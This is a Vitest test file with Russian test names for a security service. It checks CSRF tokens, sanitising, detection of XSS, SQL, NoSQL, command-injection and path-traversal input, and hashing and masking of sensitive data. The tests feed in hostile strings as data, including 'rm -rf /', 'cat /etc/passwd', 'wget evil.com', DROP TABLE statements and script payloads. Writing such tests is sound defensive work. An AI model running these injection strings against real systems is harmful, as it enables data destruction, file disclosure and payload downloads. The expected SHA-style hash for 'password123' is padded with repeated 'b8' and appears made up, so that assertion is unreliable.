import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityService } from '../../security/security.service';

describe('SecurityService', () => {
  let service: SecurityService;

  beforeEach(() => {
    process.env.CSRF_TOKEN_TTL = '3600';
    service = new SecurityService();
  });

  describe('CSRF Tokens', () => {
    it('должен генерировать CSRF токен', () => {
      const token = service.generateCsrfToken('session-123');
      
      expect(token).toBeDefined();
      expect(token.length).toBeGreaterThan(0);
    });

    it('должен валидировать правильный CSRF токен', () => {
      const sessionId = 'session-123';
      const token = service.generateCsrfToken(sessionId);
      
      expect(service.validateCsrfToken(sessionId, token)).toBe(true);
    });

    it('должен отклонять неправильный CSRF токен', () => {
      expect(service.validateCsrfToken('session-123', 'invalid-token')).toBe(false);
    });

    it('должен отклонять токен для другой сессии', () => {
      const token = service.generateCsrfToken('session-123');
      
      expect(service.validateCsrfToken('session-456', token)).toBe(false);
    });
  });

  describe('XSS Protection', () => {
    it('должен санитизировать HTML специальные символы', () => {
      const input = '<script>alert("XSS")</script>';
      const sanitized = service.sanitizeString(input);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('&lt;script&gt;');
    });

    it('должен обнаруживать XSS паттерны', () => {
      expect(service.hasXssPattern('<script>alert(1)</script>')).toBe(true);
      expect(service.hasXssPattern('javascript:alert(1)')).toBe(true);
      expect(service.hasXssPattern('onclick=alert(1)')).toBe(true);
      expect(service.hasXssPattern('<img onerror=alert(1)>')).toBe(true);
      expect(service.hasXssPattern('<svg onload=alert(1)>')).toBe(true);
    });

    it('должен пропускать безопасный текст', () => {
      expect(service.hasXssPattern('Hello, World!')).toBe(false);
      expect(service.hasXssPattern('Привет, мир!')).toBe(false);
    });
  });

  describe('SQL Injection Protection', () => {
    it('должен обнаруживать SQL injection паттерны', () => {
      expect(service.hasSqlInjectionPattern("1' OR '1'='1")).toBe(true);
      expect(service.hasSqlInjectionPattern("'; DROP TABLE users;--")).toBe(true);
      expect(service.hasSqlInjectionPattern('1; DELETE FROM users')).toBe(true);
      expect(service.hasSqlInjectionPattern('1 UNION SELECT * FROM users')).toBe(true);
    });

    it('должен обнаруживать SQL комментарии', () => {
      expect(service.hasSqlInjectionPattern('SELECT * FROM users --')).toBe(true);
      expect(service.hasSqlInjectionPattern('SELECT * FROM users #')).toBe(true);
      expect(service.hasSqlInjectionPattern('SELECT * FROM users /* */')).toBe(true);
    });

    it('должен пропускать безопасный текст', () => {
      expect(service.hasSqlInjectionPattern('Hello, World!')).toBe(false);
      expect(service.hasSqlInjectionPattern('SELECT me from the crowd')).toBe(false);
    });
  });

  describe('NoSQL Injection Protection', () => {
    it('должен обнаруживать NoSQL injection паттерны', () => {
      expect(service.hasNoSqlInjectionPattern('{$where: function}')).toBe(true);
      expect(service.hasNoSqlInjectionPattern('{$ne: null}')).toBe(true);
      expect(service.hasNoSqlInjectionPattern('{$gt: ""}')).toBe(true);
      expect(service.hasNoSqlInjectionPattern('{$regex: /pattern/}')).toBe(true);
    });

    it('должен пропускать безопасный JSON', () => {
      expect(service.hasNoSqlInjectionPattern('{"name": "John"}')).toBe(false);
      expect(service.hasNoSqlInjectionPattern('{"age": 30}')).toBe(false);
    });
  });

  describe('Command Injection Protection', () => {
    it('должен обнаруживать command injection паттерны', () => {
      expect(service.hasCommandInjectionPattern('test; rm -rf /')).toBe(true);
      expect(service.hasCommandInjectionPattern('test | cat /etc/passwd')).toBe(true);
      expect(service.hasCommandInjectionPattern('$(whoami)')).toBe(true);
      expect(service.hasCommandInjectionPattern('`id`')).toBe(true);
      expect(service.hasCommandInjectionPattern('test && wget evil.com')).toBe(true);
    });

    it('должен пропускать безопасный текст', () => {
      expect(service.hasCommandInjectionPattern('Hello, World!')).toBe(false);
      expect(service.hasCommandInjectionPattern('file.txt')).toBe(false);
    });
  });

  describe('Path Traversal Protection', () => {
    it('должен обнаруживать path traversal паттерны', () => {
      expect(service.hasPathTraversalPattern('../../../etc/passwd')).toBe(true);
      expect(service.hasPathTraversalPattern('..\\..\\windows\\system32')).toBe(true);
      expect(service.hasPathTraversalPattern('%2e%2e%2f')).toBe(true);
      expect(service.hasPathTraversalPattern('%2e%2e/')).toBe(true);
    });

    it('должен пропускать безопасные пути', () => {
      expect(service.hasPathTraversalPattern('/home/user/file.txt')).toBe(false);
      expect(service.hasPathTraversalPattern('C:\\Users\\file.txt')).toBe(false);
    });
  });

  describe('validateInput', () => {
    it('должен валидировать безопасный ввод', () => {
      const result = service.validateInput('Hello, World!', {
        checkXss: true,
        checkSqlInjection: true,
      });
      
      expect(result.valid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('должен отклонять XSS ввод', () => {
      const result = service.validateInput('<script>alert(1)</script>', {
        checkXss: true,
      });
      
      expect(result.valid).toBe(false);
      expect(result.error).toContain('XSS');
    });

    it('должен отклонять SQL injection ввод', () => {
      const result = service.validateInput("'; DROP TABLE users;--", {
        checkSqlInjection: true,
      });
      
      expect(result.valid).toBe(false);
      expect(result.error).toContain('SQL');
    });

    it('должен отклонять ввод превышающий maxLength', () => {
      const longInput = 'a'.repeat(1001);
      const result = service.validateInput(longInput, {
        maxLength: 1000,
      });
      
      expect(result.valid).toBe(false);
      expect(result.error).toContain('length');
    });
  });

  describe('Sensitive Data Handling', () => {
    it('должен хэшировать чувствительные данные', () => {
      const hash = service.hashSensitiveData('password123');
      
      expect(hash).toBe('ef92b778baab7c9e2930197a9226c8b8b8b8b8b8b8b8b8b8b8b8b8b8b8b8b8b8');
    });

    it('должен маскировать чувствительные данные', () => {
      const masked = service.maskSensitiveData('password123', 4);
      
      expect(masked).toBe('*******d123');
    });

    it('должен маскировать короткие данные', () => {
      const masked = service.maskSensitiveData('abc', 4);
      
      expect(masked).toBe('***');
    });
  });
});
